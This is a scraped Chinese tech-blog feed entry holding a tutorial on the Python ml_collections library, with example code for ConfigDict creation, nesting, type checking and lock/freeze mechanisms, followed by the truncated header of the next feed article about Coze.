itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            你还没受够python原生字典的写法吗？用ml_collections试试吧
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/465848663552974/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    茫茫此生何所求
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T03:55:27.000Z" title="Tue Jan 20 2026 03:55:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、ml_collections是什么</h2>
<p>ml_collections 是一个python库，初衷设计是专为机器学习配置。而我在实际使用过程中，把它当做来一个原生字典的替代项，感觉很好用。本文主要介绍基础的使用和锁机制。</p>
<p>地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpypi.org%2Fproject%2Fml-collections%2F" target="_blank" title="https://pypi.org/project/ml-collections/" ref="nofollow noopener noreferrer">pypi.org/project/ml-…</a></p>
<p>核心特性：</p>
<ul>
<li>可以让字典使用.的方式来访问和修改，而原生方式是[""]=xx；</li>
<li>提供了锁机制，当写完字典后，在一定程度上防止了误修改；</li>
<li>自动带了数据类型检查；</li>
</ul>
<h2 data-id="heading-1">二、基础用法</h2>
<p>下文代码所用的版本：1.1.0</p>
<h3 data-id="heading-2">1. 创建方式1：ConfigDict()</h3>
<pre><code class="hljs language-ini" lang="ini">from ml_collections import ConfigDict

<span class="hljs-comment"># ========== 方式1：创建空的ConfigDict，最基础</span>
<span class="hljs-attr">cfg</span> = ConfigDict()

<span class="hljs-comment"># ========== 方式2：初始化时传入原生字典，一键创建</span>
<span class="hljs-attr">cfg</span> = ConfigDict({
    "lr": 0.001,
    "batch_size": 32,
    "epochs": 100
})

<span class="hljs-comment"># ========== 方式3：空配置逐步赋值创建</span>
<span class="hljs-attr">cfg</span> = ConfigDict()
<span class="hljs-comment"># 基础单层配置赋值</span>
<span class="hljs-attr">cfg.lr</span> = <span class="hljs-number">0.001</span>
<span class="hljs-attr">cfg.batch_size</span> = <span class="hljs-number">32</span>
<span class="hljs-attr">cfg.epochs</span> = <span class="hljs-number">200</span>
<span class="hljs-comment"># 配置支持所有Python基础数据类型</span>
<span class="hljs-attr">cfg.device</span> = <span class="hljs-string">"cuda"</span>
<span class="hljs-attr">cfg.use_amp</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">cfg.weight_decay</span> = <span class="hljs-number">1</span>e-<span class="hljs-number">5</span>

</code></pre>
<h3 data-id="heading-3">2. 创建方式2：create()，可以一次性把配置都写完</h3>
<pre><code class="hljs language-ini" lang="ini">from ml_collections import config_dict

<span class="hljs-comment"># 用 create 一次性写完所有嵌套配置</span>
<span class="hljs-attr">cfg</span> = config_dict.create(
    <span class="hljs-comment"># 数据集配置</span>
    <span class="hljs-attr">data</span>=config_dict.create(
        <span class="hljs-attr">dataset</span>=<span class="hljs-string">"cifar10"</span>,
        <span class="hljs-attr">data_dir</span>=<span class="hljs-string">"./data"</span>,
        <span class="hljs-attr">batch_size</span>=<span class="hljs-number">32</span>,
        <span class="hljs-attr">num_workers</span>=<span class="hljs-number">4</span>
    ),
    <span class="hljs-comment"># 模型配置</span>
    <span class="hljs-attr">model</span>=config_dict.create(
        <span class="hljs-attr">backbone</span>=<span class="hljs-string">"resnet18"</span>,
        <span class="hljs-attr">num_classes</span>=<span class="hljs-number">10</span>,
        <span class="hljs-attr">dropout</span>=<span class="hljs-number">0.2</span>,
        <span class="hljs-attr">pretrained</span>=<span class="hljs-literal">True</span>
    ),
    <span class="hljs-comment"># 训练配置 + 嵌套的优化器子配置</span>
    <span class="hljs-attr">train</span>=config_dict.create(
        <span class="hljs-attr">epochs</span>=<span class="hljs-number">200</span>,
        <span class="hljs-attr">lr</span>=<span class="hljs-number">0.001</span>,
        <span class="hljs-attr">optimizer</span>=config_dict.create(
            <span class="hljs-attr">name</span>=<span class="hljs-string">"adam"</span>,
            <span class="hljs-attr">weight_decay</span>=<span class="hljs-number">1</span>e-<span class="hljs-number">5</span>
        )
    )
)


<span class="hljs-comment"># 打印配置（可选）</span>
print("实验配置：", cfg)
</code></pre>
<h3 data-id="heading-4">3. 嵌套</h3>
<p>字典的值也可以是ConfigDict</p>
<pre><code class="hljs language-ini" lang="ini">from ml_collections import ConfigDict

<span class="hljs-comment"># 创建根配置</span>
<span class="hljs-attr">cfg</span> = ConfigDict()

<span class="hljs-comment"># --------------------------</span>
<span class="hljs-comment"># 第一层：数据集相关配置（嵌套1层）</span>
<span class="hljs-comment"># --------------------------</span>
<span class="hljs-attr">cfg.data</span> = ConfigDict()  <span class="hljs-comment"># 先给data赋值为一个空的ConfigDict</span>
<span class="hljs-attr">cfg.data.dataset_name</span> = <span class="hljs-string">"cifar10"</span>  <span class="hljs-comment"># 数据集名称</span>
<span class="hljs-attr">cfg.data.data_path</span> = <span class="hljs-string">"./dataset/cifar10"</span>  <span class="hljs-comment"># 数据存放路径</span>
<span class="hljs-attr">cfg.data.batch_size</span> = <span class="hljs-number">32</span>  <span class="hljs-comment"># 批次大小</span>
<span class="hljs-attr">cfg.data.num_workers</span> = <span class="hljs-number">4</span>  <span class="hljs-comment"># 加载数据的线程数</span>

<span class="hljs-comment"># --------------------------</span>
<span class="hljs-comment"># 第一层：模型相关配置（嵌套1层）</span>
<span class="hljs-comment"># --------------------------</span>
<span class="hljs-attr">cfg.model</span> = ConfigDict()
<span class="hljs-attr">cfg.model.backbone</span> = <span class="hljs-string">"resnet18"</span>  <span class="hljs-comment"># 模型骨干网络</span>
<span class="hljs-attr">cfg.model.num_classes</span> = <span class="hljs-number">10</span>  <span class="hljs-comment"># 分类任务的类别数</span>
<span class="hljs-attr">cfg.model.dropout_rate</span> = <span class="hljs-number">0.2</span>  <span class="hljs-comment"># dropout正则化概率</span>
<span class="hljs-attr">cfg.model.use_pretrain</span> = <span class="hljs-literal">True</span>  <span class="hljs-comment"># 是否使用预训练权重</span>

<span class="hljs-comment"># --------------------------</span>
<span class="hljs-comment"># 第一层：训练相关配置（嵌套2层）</span>
<span class="hljs-comment"># --------------------------</span>
<span class="hljs-attr">cfg.train</span> = ConfigDict()
<span class="hljs-attr">cfg.train.epochs</span> = <span class="hljs-number">200</span>  <span class="hljs-comment"># 训练总轮数</span>
<span class="hljs-attr">cfg.train.base_lr</span> = <span class="hljs-number">0.001</span>  <span class="hljs-comment"># 基础学习率</span>
<span class="hljs-comment"># 训练配置里再嵌套：优化器的子配置（嵌套第二层）</span>
<span class="hljs-attr">cfg.train.optimizer</span> = ConfigDict()
<span class="hljs-attr">cfg.train.optimizer.name</span> = <span class="hljs-string">"adam"</span>  <span class="hljs-comment"># 优化器名称</span>
<span class="hljs-attr">cfg.train.optimizer.weight_decay</span> = <span class="hljs-number">0.00005</span>  <span class="hljs-comment"># 权重衰减</span>

<span class="hljs-comment"># --------------------------</span>
<span class="hljs-comment"># 取值：链式点语法，一层一层访问</span>
<span class="hljs-comment"># --------------------------</span>
print("数据集名称：", cfg.data.dataset_name)
print("模型骨干网络：", cfg.model.backbone)
print("优化器名称：", cfg.train.optimizer.name)
print("权重衰减系数：", cfg.train.optimizer.weight_decay)
</code></pre>
<h3 data-id="heading-5">4. 读取方式</h3>
<p>同时支持.式和[]中括号方式</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> ml_collections <span class="hljs-keyword">import</span> ConfigDict

cfg = ConfigDict({
    <span class="hljs-string">"lr"</span>:<span class="hljs-number">0.001</span>,
    <span class="hljs-string">"model"</span>: ConfigDict({<span class="hljs-string">"backbone"</span>:<span class="hljs-string">"resnet18"</span>})
})

<span class="hljs-comment"># ========== 方式1：点语法 读取</span>
<span class="hljs-built_in">print</span>(cfg.lr)               <span class="hljs-comment"># 输出：0.001</span>
<span class="hljs-built_in">print</span>(cfg.model.backbone)   <span class="hljs-comment"># 输出：resnet18</span>

<span class="hljs-comment"># ========== 方式2：字典中括号语法 读取</span>
<span class="hljs-built_in">print</span>(cfg[<span class="hljs-string">"lr"</span>])            <span class="hljs-comment"># 输出：0.001</span>
<span class="hljs-built_in">print</span>(cfg[<span class="hljs-string">"model"</span>][<span class="hljs-string">"backbone"</span>]) <span class="hljs-comment"># 输出：resnet18</span>
</code></pre>
<h3 data-id="heading-6">5. 删除</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> ml_collections <span class="hljs-keyword">import</span> ConfigDict

cfg = ConfigDict({<span class="hljs-string">"lr"</span>:<span class="hljs-number">0.001</span>, <span class="hljs-string">"batch_size"</span>:<span class="hljs-number">32</span>, <span class="hljs-string">"epochs"</span>:<span class="hljs-number">200</span>})

<span class="hljs-keyword">del</span> cfg.epochs <span class="hljs-comment"># 删除基础字段</span>
<span class="hljs-keyword">del</span> cfg[<span class="hljs-string">"batch_size"</span>] <span class="hljs-comment"># 用字典语法删除，等价</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"删除后配置："</span>, cfg) <span class="hljs-comment"># 输出：lr: 0.001</span>
</code></pre>
<h3 data-id="heading-7">6. 自动类型校验</h3>
<p>int可以赋值给int，int可以赋值给float，int不能赋值给string，string也不能赋值给int</p>
<pre><code class="hljs language-ini" lang="ini">from ml_collections import config_dict

<span class="hljs-attr">cfg</span> = config_dict.ConfigDict()
<span class="hljs-attr">cfg.float_field</span> = <span class="hljs-number">12.6</span> <span class="hljs-comment"># float类型</span>
<span class="hljs-attr">cfg.integer_field</span> = <span class="hljs-number">123</span> <span class="hljs-comment"># int类型</span>
<span class="hljs-attr">cfg.another_integer_field</span> = <span class="hljs-number">234</span> <span class="hljs-comment"># int类型</span>
<span class="hljs-attr">cfg.nested</span> = config_dict.ConfigDict()
<span class="hljs-attr">cfg.nested.string_field</span> = <span class="hljs-string">'tom'</span> <span class="hljs-comment"># str类型</span>

print(cfg.integer_field)  <span class="hljs-comment"># Prints 123.</span>
print(cfg<span class="hljs-section">['integer_field']</span>)  <span class="hljs-comment"># Prints 123 as well.</span>

try:
  <span class="hljs-attr">cfg.integer_field</span> = <span class="hljs-string">'tom'</span>  <span class="hljs-comment"># 将str赋值给int类型，报错</span>
except TypeError as e:
  print(e)

<span class="hljs-attr">cfg.float_field</span> = <span class="hljs-number">12</span>  <span class="hljs-comment"># int可以给float赋值，自动类型转换</span>
<span class="hljs-attr">cfg.nested.string_field</span> = u<span class="hljs-string">'bob'</span>  <span class="hljs-comment"># str赋值</span>

print(cfg)
</code></pre>
<h2 data-id="heading-8">三、锁机制</h2>
<h3 data-id="heading-9">1. 方式1: lock()</h3>
<ul>
<li>lock后，不可以新增字段，不可以删除字段</li>
<li>lock后，可以修改已有的字段，包括嵌套里的字段</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> ml_collections <span class="hljs-keyword">import</span> ConfigDict

<span class="hljs-comment"># 1. 创建配置并初始化【已有字段】</span>
cfg = ConfigDict()
cfg.lr = <span class="hljs-number">0.001</span>
cfg.batch_size = <span class="hljs-number">32</span>
<span class="hljs-comment"># 嵌套配置</span>
cfg.model = ConfigDict()
cfg.model.dropout = <span class="hljs-number">0.2</span>

<span class="hljs-comment"># 2. 核心：执行上锁操作</span>
cfg.lock()

<span class="hljs-comment"># 上锁后 - 修改【已有字段】：正常生效，无报错 </span>
cfg.lr = <span class="hljs-number">0.0005</span>          <span class="hljs-comment"># 修改根层级已有字段 ✔️</span>
cfg.batch_size = <span class="hljs-number">64</span>      <span class="hljs-comment"># 修改根层级已有字段 ✔️</span>
cfg.model.dropout = <span class="hljs-number">0.1</span>  <span class="hljs-comment"># 修改嵌套层级已有字段 ✔️</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"修改后的值："</span>, cfg.lr, cfg.batch_size, cfg.model.dropout)

<span class="hljs-comment">#  特性2：上锁后 - 新增【任何字段】：直接报错</span>
<span class="hljs-keyword">try</span>:
    cfg.epochs = <span class="hljs-number">200</span>     <span class="hljs-comment"># 新增根层级字段 </span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"❌ 新增根字段报错："</span>, e)

<span class="hljs-keyword">try</span>:
    cfg.model.backbone = <span class="hljs-string">"resnet18"</span>  <span class="hljs-comment"># 新增嵌套层级字段 ❌</span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"❌ 新增嵌套字段报错："</span>, e)

<span class="hljs-comment"># 特性3：上锁后 - 删除【任何字段】：直接报错 </span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">del</span> cfg.lr  <span class="hljs-comment"># 删除根层级已有字段 ❌</span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"❌ 删除根字段报错："</span>, e)

<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">del</span> cfg.model.dropout  <span class="hljs-comment"># 删除嵌套层级已有字段 ❌</span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"❌ 删除嵌套字段报错："</span>, e)
</code></pre>
<ul>
<li>判断是否上锁</li>
</ul>
<pre><code class="hljs language-vbscript" lang="vbscript">pr<span class="hljs-built_in">int</span>(cfg.is_locked) # 上锁后返回 <span class="hljs-literal">True</span>，解锁后返回 <span class="hljs-literal">False</span>
</code></pre>
<ul>
<li>彻底解锁</li>
</ul>
<pre><code class="hljs language-scss" lang="scss">cfg<span class="hljs-selector-class">.unlock</span>()
</code></pre>
<ul>
<li>临时解锁</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> ml_collections <span class="hljs-keyword">import</span> ConfigDict

<span class="hljs-comment"># 1. 创建配置 + 赋值已有字段</span>
cfg = ConfigDict()
cfg.lr = <span class="hljs-number">0.001</span>
cfg.batch_size = <span class="hljs-number">32</span>
cfg.model = ConfigDict()

<span class="hljs-comment"># 2. 上锁（核心前提）</span>
cfg.lock()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"初始上锁状态: <span class="hljs-subst">{cfg.is_locked}</span>"</span>)  <span class="hljs-comment"># True</span>

<span class="hljs-comment"># 临时解锁 with cfg.unlocked()</span>
<span class="hljs-comment"># 特性：代码块内 临时解锁，可自由 新增/修改/删除 任何字段；代码块结束 自动重新上锁，无需手动操作</span>
<span class="hljs-keyword">with</span> cfg.unlocked():
    <span class="hljs-comment"># ✅ 临时修改已有字段</span>
    cfg.lr = <span class="hljs-number">0.0005</span>
    cfg.model.dropout = <span class="hljs-number">0.1</span>
    <span class="hljs-comment"># ✅ 临时新增字段（根+嵌套都可以）</span>
    cfg.epochs = <span class="hljs-number">200</span>
    cfg.model.backbone = <span class="hljs-string">"resnet18"</span>
    <span class="hljs-comment"># ✅ 临时删除字段</span>
    <span class="hljs-keyword">del</span> cfg.batch_size

<span class="hljs-comment"># 验证：代码块结束后自动上锁 + 操作全部生效</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"临时解锁后状态: <span class="hljs-subst">{cfg.is_locked}</span>"</span>)  <span class="hljs-comment"># True 自动上锁</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"修改后: <span class="hljs-subst">{cfg.lr}</span>, <span class="hljs-subst">{cfg.model.dropout}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"新增后: <span class="hljs-subst">{cfg.epochs}</span>, <span class="hljs-subst">{cfg.model.backbone}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"删除后batch_size是否存在: <span class="hljs-subst">{<span class="hljs-string">'batch_size'</span> <span class="hljs-keyword">in</span> cfg}</span>"</span>)  <span class="hljs-comment"># False</span>

<span class="hljs-comment"># 上锁状态下 依旧禁止新增/删除（安全兜底）</span>
<span class="hljs-keyword">try</span>:
    cfg.device = <span class="hljs-string">"cuda"</span>
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n上锁禁止新增: <span class="hljs-subst">{e.args[<span class="hljs-number">0</span>]}</span>"</span>)
</code></pre>
<h3 data-id="heading-10">2. 方式2: FrozenConfigDict()</h3>
<ul>
<li>创建，特性：禁止修改、删除、新增</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 正确导入</span>
<span class="hljs-keyword">from</span> ml_collections <span class="hljs-keyword">import</span> ConfigDict
<span class="hljs-keyword">from</span> ml_collections.config_dict <span class="hljs-keyword">import</span> FrozenConfigDict

<span class="hljs-comment"># ✔️ 方式1：ConfigDict 转 FrozenConfigDict</span>
cfg = ConfigDict()
cfg.lr = <span class="hljs-number">0.001</span>
cfg.batch_size = <span class="hljs-number">32</span>
<span class="hljs-comment"># 嵌套ConfigDict 正确写法</span>
cfg.model = ConfigDict()
cfg.model.dropout = <span class="hljs-number">0.2</span>
cfg.model.backbone = <span class="hljs-string">"resnet18"</span>

f_cfg = FrozenConfigDict(cfg)

<span class="hljs-comment"># ✔️ 方式2：直接创建 FrozenConfigDict (传字典)</span>
f_cfg2 = FrozenConfigDict({<span class="hljs-string">"lr"</span>:<span class="hljs-number">0.001</span>, <span class="hljs-string">"batch_size"</span>:<span class="hljs-number">32</span>})

<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span>*<span class="hljs-number">20</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"FrozenConfigDict只读配置："</span>, f_cfg)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"是否为冰封配置："</span>, <span class="hljs-built_in">isinstance</span>(f_cfg, FrozenConfigDict)) <span class="hljs-comment"># True</span>

<span class="hljs-comment"># 所有【写操作】全部禁止</span>
<span class="hljs-comment"># 1. ❌ 禁止修改已有字段</span>
<span class="hljs-keyword">try</span>:
    f_cfg.lr = <span class="hljs-number">0.0005</span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n❌ 修改报错: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-comment"># 2. ❌ 禁止新增字段</span>
<span class="hljs-keyword">try</span>:
    f_cfg.epochs = <span class="hljs-number">200</span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"❌ 新增报错: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-comment"># 3. ❌ 禁止删除字段</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">del</span> f_cfg.batch_size
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"❌ 删除报错: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-comment"># 4. ❌ 无lock/unlock方法，天生只读，无需上锁</span>
<span class="hljs-keyword">try</span>:
    f_cfg.lock()
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"❌ 无lock方法: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-comment"># 唯一支持的操作：【读取】 </span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span>*<span class="hljs-number">20</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"✅ 读取基础字段："</span>, f_cfg.lr)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"✅ 读取嵌套字段："</span>, f_cfg.model.dropout)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"✅ 字典方式读取："</span>, f_cfg[<span class="hljs-string">"batch_size"</span>])
</code></pre>
<ul>
<li>FrozenConfigDict与ConfigDict转换</li>
</ul>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 正确导入</span>
from ml_collections import ConfigDict
from ml_collections.config_dict import FrozenConfigDict

<span class="hljs-comment"># ✔️ 转换1: ConfigDict → FrozenConfigDict (冻结，可变→不可变)</span>
<span class="hljs-attr">cfg</span> = ConfigDict({<span class="hljs-string">"lr"</span>:<span class="hljs-number">0.001</span>, <span class="hljs-string">"batch_size"</span>:<span class="hljs-number">32</span>})
<span class="hljs-attr">frozen_cfg</span> = FrozenConfigDict(cfg)

<span class="hljs-comment"># ✔️ 转换2: FrozenConfigDict → ConfigDict (解冻，不可变→可变，恢复所有权限)</span>
<span class="hljs-attr">unfrozen_cfg</span> = ConfigDict(frozen_cfg)

<span class="hljs-comment"># 解冻后 ✅ 恢复全部操作权限：增/删/改 都可以</span>
<span class="hljs-attr">unfrozen_cfg.lr</span> = <span class="hljs-number">1</span>e-<span class="hljs-number">4</span>        <span class="hljs-comment"># 修改 ✔️</span>
<span class="hljs-attr">unfrozen_cfg.device</span> = <span class="hljs-string">"cuda"</span>  <span class="hljs-comment"># 新增 ✔️</span>
del unfrozen_cfg.batch_size   <span class="hljs-comment"># 删除 ✔️</span>
print("✅ 解冻后ConfigDict：", unfrozen_cfg)
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[扣子（Coze）实战：公众号这一教人“撩天”玩法，我用扣子复刻了]]></title>    <link>https://juejin.cn/post/7596983314806816818</link>    <guid>https://juejin.cn/post/7596983314806816818</guid>    <pubDate>2026-01-20T03:57:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596983314806816818" data-draft-id="7596975035438727177" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="扣子（Coze）实战：公众号这一教人“撩天”玩法，我用扣子复刻了"/> <meta itemprop="keywords" content="Coze"/> <meta itemprop="datePublished" content="2026-01-20T03:57:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="吾鳴"/> <meta itemprop="url" content="https://juejin.cn/user/3683842894347076"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            扣子（Coze）实战：公众号这一教人“撩天”玩法，我用扣子复刻了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3683842894347076/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    吾鳴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T03:57:32.000Z" title="Tue Jan 20 2026 03:57:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
